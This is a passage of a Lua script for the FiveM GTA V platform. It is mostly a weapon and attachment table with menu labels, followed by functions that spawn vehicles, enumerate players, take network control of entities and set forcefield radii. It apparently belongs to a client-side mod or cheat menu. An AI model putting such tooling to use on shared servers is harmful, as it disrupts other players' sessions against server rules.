                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        CarbineRifleMkII = {
            id = 'weapon_carbinerifle_mk2',
            name = '~h~~r~> ~s~Carbine Rifle Mk II ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_CR_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_CR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        },
        AdvancedRifle = {
            id = 'weapon_advancedrifle',
            name = '~h~~r~> ~s~Advanced Rifle ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                }
            }
        },
        SpecialCarbine = {
            id = 'weapon_specialcarbine',
            name = '~h~~r~> ~s~Special Carbine',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        SpecialCarbineMkII = {
            id = 'weapon_specialcarbine_mk2',
            name = '~h~~r~> ~s~Special Carbine Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_SC_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_SC_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        },
        BullpupRifle = {
            id = 'weapon_bullpuprifle',
            name = '~h~~r~> ~s~Bullpup Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        BullpupRifleMkII = {
            id = 'weapon_bullpuprifle_mk2',
            name = '~h~~r~> ~s~Bullpup Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Armor Piercing Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_BP_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_BP_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        CompactRifle = {
            id = 'weapon_compactrifle',
            name = '~h~~r~> ~s~Compact Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_03'
                    }
                }
            }
        }
    },
    LMG = {
        MG = {
            id = 'weapon_mg',
            name = '~h~~r~> ~s~MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_02'
                    }
                }
            }
        },
        CombatMG = {
            id = 'weapon_combatmg',
            name = '~h~~r~> ~s~Combat MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        CombatMGMkII = {
            id = 'weapon_combatmg_mk2',
            name = '~h~~r~> ~s~Combat MG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_MG_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_MG_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        },
        GusenbergSweeper = {
            id = 'weapon_gusenberg',
            name = '~h~~r~> ~s~GusenbergSweeper',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_02'
                    }
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = 'weapon_sniperrifle',
            name = '~h~~r~> ~s~Sniper Rifle',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE'},
                    {
                        name = '~h~~r~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        HeavySniper = {
            id = 'weapon_heavysniper',
            name = '~h~~r~> ~s~Heavy Sniper',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE'},
                    {
                        name = '~h~~r~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                }
            }
        },
        HeavySniperMkII = {
            id = 'weapon_heavysniper_mk2',
            name = '~h~~r~> ~s~Heavy Sniper Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Armor Piercing Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ'
                    },
                    {
                        name = '~h~~r~> ~s~Explosive Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    },
                    {
                        name = '~h~~r~> ~s~Nigt Vision Scope',
                        id = 'COMPONENT_AT_SCOPE_NV'
                    },
                    {
                        name = '~h~~r~> ~s~Thermal Scope',
                        id = 'COMPONENT_AT_SCOPE_THERMAL'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_SR_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_SR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~r~> ~s~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    },
                    {
                        name = '~h~~r~> ~s~Bell-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_09'
                    }
                }
            }
        },
        MarksmanRifle = {
            id = 'weapon_marksmanrifle',
            name = '~h~~r~> ~s~Marksman Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        MarksmanRifleMkII = {
            id = 'weapon_marksmanrifle_mk2',
            name = '~h~~r~> ~s~Marksman Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_MRFL_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_MRFL_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        }
    },
    Heavy = {
        RPG = {
            id = 'weapon_rpg',
            name = '~h~~r~> ~s~RPG',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncher = {
            id = 'weapon_grenadelauncher',
            name = '~h~~r~> ~s~Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncherSmoke = {
            id = 'weapon_grenadelauncher_smoke',
            name = '~h~~r~> ~s~Grenade Launcher Smoke',
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {
            id = 'weapon_minigun',
            name = '~h~~r~> ~s~Minigun',
            bInfAmmo = false,
            mods = {}
        },
        FireworkLauncher = {
            id = 'weapon_firework',
            name = '~h~~r~> ~s~Firework Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Railgun = {
            id = 'weapon_railgun',
            name = '~h~~r~> ~s~Railgun',
            bInfAmmo = false,
            mods = {}
        },
        HomingLauncher = {
            id = 'weapon_hominglauncher',
            name = '~h~~r~> ~s~Homing Launcher',
            bInfAmmo = false,
            mods = {}
        },
        CompactGrenadeLauncher = {
            id = 'weapon_compactlauncher',
            name = '~h~~r~> ~s~Compact Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {
            id = 'weapon_rayminigun',
            name = '~h~~r~> ~s~Widowmaker',
            bInfAmmo = false,
            mods = {}
        }
    },
    Throwables = {
        Grenade = {
            id = 'weapon_grenade',
            name = '~h~~r~> ~s~Grenade',
            bInfAmmo = false,
            mods = {}
        },
        BZGas = {
            id = 'weapon_bzgas',
            name = '~h~~r~> ~s~BZ Gas',
            bInfAmmo = false,
            mods = {}
        },
        MolotovCocktail = {
            id = 'weapon_molotov',
            name = '~h~~r~> ~s~Molotov Cocktail',
            bInfAmmo = false,
            mods = {}
        },
        StickyBomb = {
            id = 'weapon_stickybomb',
            name = '~h~~r~> ~s~Sticky Bomb',
            bInfAmmo = false,
            mods = {}
        },
        ProximityMines = {
            id = 'weapon_proxmine',
            name = '~h~~r~> ~s~Proximity Mines',
            bInfAmmo = false,
            mods = {}
        },
        Snowballs = {
            id = 'weapon_snowball',
            name = '~h~~r~> ~s~Snowballs',
            bInfAmmo = false,
            mods = {}
        },
        PipeBombs = {
            id = 'weapon_pipebomb',
            name = '~h~~r~> ~s~Pipe Bombs',
            bInfAmmo = false,
            mods = {}
        },
        Baseball = {
            id = 'weapon_ball',
            name = '~h~~r~> ~s~Baseball',
            bInfAmmo = false,
            mods = {}
        },
        TearGas = {
            id = 'weapon_smokegrenade',
            name = '~h~~r~> ~s~Tear Gas',
            bInfAmmo = false,
            mods = {}
        },
        Flare = {
            id = 'weapon_flare',
            name = '~h~~r~> ~s~Flare',
            bInfAmmo = false,
            mods = {}
        }
    },
    Misc = {
        Parachute = {
            id = 'gadget_parachute',
            name = '~h~~r~> ~s~Parachute',
            bInfAmmo = false,
            mods = {}
        },
        FireExtinguisher = {
            id = 'weapon_fireextinguisher',
            name = '~h~~r~> ~s~Fire Extinguisher',
            bInfAmmo = false,
            mods = {}
        }
    }
}


defaultVehAction = ''
if GetVehiclePedIsUsing(PlayerPedId()) then
    veh = GetVehiclePedIsUsing(PlayerPedId())
end
local bl = false
local bm = true
local bn = GetPlayerServerId(PlayerPedId(-1))
local bo = GetPlayerName(bn)

local function SpawnVeh(model, PlaceSelf)
	RequestModel(GetHashKey(model))
	Wait(500)
	if HasModelLoaded(GetHashKey(model)) then
		local coords = GetEntityCoords(PlayerPedId())
		local xf = GetEntityForwardX(PlayerPedId())
		local yf = GetEntityForwardY(PlayerPedId())
		local heading = GetEntityHeading(PlayerPedId())
		local veh = CreateVehicle(GetHashKey(model), coords.x+xf*5, coords.y+yf*5, coords.z, heading, 1, 1)
		if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
	else ShowInfo("~r~Model not recognized") end
end


local presensecheck = {
    state = true
}

local presense = true

nname = nil

count = {}

local Feltzer = false

local vehlistv = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Tiago", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}

zzzt = 1


ForcefieldRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0,100.0}

ForcefieldRadius = 5.0


Citizen.CreateThread(
    function()
        for i = 0, 256 do
            local count1 = GetPlayerName(i)
            if count1 ~= '**Invalid**' then
                table.insert(count, count1)
            end
        end
    end
)

Citizen.CreateThread(function()
    RequestModel('s_m_y_swat_01')
    RequestModel('s_m_y_hwaycop_01')
    for i = 1, #vehlistv do
        RequestModel(vehlistv[i])
        Citizen.Wait(200)
    end
end)

Citizen.CreateThread(
    function()
        while presense do
            Citizen.Wait(5000)
            for i = 1, #count do
                if GetPlayerName(i) ~= count[i] then
                    table.remove(count, i, GetPlayerName(i))
                end
            end
        end
    end
)



Citizen.CreateThread(
    function()
        while presense do
            SetRP()
            Citizen.Wait(100)
            zzzt = zzzt + 1
            if zzzt == 29 then
                zzzt = 1
            end
        end
    end
)

function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
